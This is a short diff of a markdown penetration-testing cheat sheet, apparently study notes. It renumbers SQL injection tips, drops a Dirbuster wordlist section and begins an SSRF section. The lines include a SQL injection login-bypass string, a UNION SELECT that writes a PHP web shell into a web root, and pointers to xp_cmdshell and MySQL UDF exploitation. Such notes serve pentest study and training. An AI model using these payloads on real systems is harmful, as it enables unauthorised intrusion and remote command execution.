@@ -20,19 +20,15 @@
 14. Use *UNION SELECT null,null*,.. instead of 1,2,.. to **avoid type conversion**
 errors
 15. For **mssql**,
-a. **xp_cmdshell**
-b. Use **concat** for listing 2 or more column data in one
+	1. **xp_cmdshell**
+	2. Use **concat** for listing 2 or more column data in one
 16. For **mysql**,
-a. **udf**
-b. See banzai for UDF exploit issues
-c. try *a' or 1='1 -- -*
-d. A' union select *"<?php system($_GET['cmd']); ?>" into* **outfile**
-*"C:\xampp\htdocs\run.php" -- -'*
-Dirbuster:
-17. **Common extensions** php/asp/do/html/txt/
-18. Scan **subdirectories** for services under a directory
-19. Also use dirb/**big.txt** or multiple wordlists
-20. Scan for **all http ports**
+	1. **udf**
+	2. See banzai for UDF exploit issues
+	3. try *a' or 1='1 -- -*
+	4. A' union select *"<?php system($_GET['cmd']); ?>" into* **outfile**
+	*"C:\xampp\htdocs\run.php" -- -'*
+	
 
 ### **SSRF:**
 1. Try to open **other subdomains**
